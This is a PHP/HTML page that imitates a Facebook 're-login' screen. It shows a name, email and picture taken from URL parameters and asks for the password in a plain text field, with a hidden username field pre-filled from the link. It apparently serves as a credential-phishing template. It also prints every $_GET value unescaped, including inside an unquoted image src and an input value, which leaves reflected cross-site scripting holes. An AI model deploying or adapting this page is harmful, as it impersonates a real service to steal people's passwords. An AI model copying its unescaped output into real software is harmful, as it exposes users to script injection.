<!DOCTYPE html>
<html>
<head>
	<title></title>
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="password errorstyle.css">
	<script src="javascript/jquery-3.1.1.min.js"></script>
	<script src="javascript/bootstrap.min.js"></script>
	<script src="javascript/jquery.min.js"></script>
    <script type="text/javascript" src="javascript/scrit.js"></script>
    

</head>
<body>
<div class="header">
<div class="row">
<div class="col-md-12"  style="background-color: #3b5998;height: 120px">
<img src="image/images.png">
</div>
<div class="col-md-12" style="background-color:#dfe3ee;height: 110px ">
</div>
<div class="col-md-3" style="background-color: #dfe3ee;height:300px ">
</div>
<div class="col-md-6" style="background-color: #f2f2f2;height: 300px">
<div class="row">
	<div class="col-md-12 "><font size="6">facebooklogin</font><hr>
</div>
</div>
<div class="row">
	<div class="col-md-3">
	</div>
	<div class="col-md-3">
	<label>login as</label>
	</div>
	<div class="col-md-3">

	<img src=<?php echo $_GET['pic']; ?> width="40" height="25">

	<div class="col-md-2">
	
	
    </div>
	</div>
	<div class="col-md-1">	
	</div>
</div>
<div class="row">
	<div class="col-md-7" style="background-color: #f2f2f2;height:20px" >
	</div>
	<div class="col-md-3" style="background-color: #f2f2f2;height:20px">
	<label><font color="blue">Not<?php echo $_GET['name']?></font></label>
	</div>
	<div class="col-md-2" style="background-color: #f2f2f2;height:20px">

	<?php echo $_GET['email'] ?>
	<label><?php echo $_GET['name']?></label>
	
	</div>
</div>
<div class="row">
	<div class="col-md-3">
	</div>
	<div class="col-md-3">
     <label>password</label>
     </div>
     <div class="col-md-3">
     <input type="hidden" value="<?php echo $_GET['email']?>" id="username">
     <input type="text" name="password" id="password">
     </div>
     <div class="col-md-3">	
     </div>
</div>
<div class="row">
	<div class="col-md-6">
	</div>
	<div class="col-md-1">
	<input type="checkbox" name="checkbox"  checked>
	</div>
	<div class="col-md-5">
	<p>keep me logged in</p>
	</div>
	
</div>
<div class="row">
	<div class="col-md-6">
	</div>
	<div class="col-md-1">
	<button class="button" id="login" style="background-color: #3b5998;"><font color="white">login</font></button>
	
	</div>
	<div class="col-md-5">
	<p>or <font color="blue">sign up for facebook</font></p>
	</div>
</div>
<div class="row">
 	<div class="col-md-6">
 	</div>
 	<div class="col-md-6">
	<p><font color="blue"> forgotten password?</font></p>
	</div>
</div>
</div>

<div class="col-md-3" style="background-color: #dfe3ee;height:300px ">	
</div>
<div class="col-md-12" style="background-color:#dfe3ee;height: 135px "></div>
</body>
</html>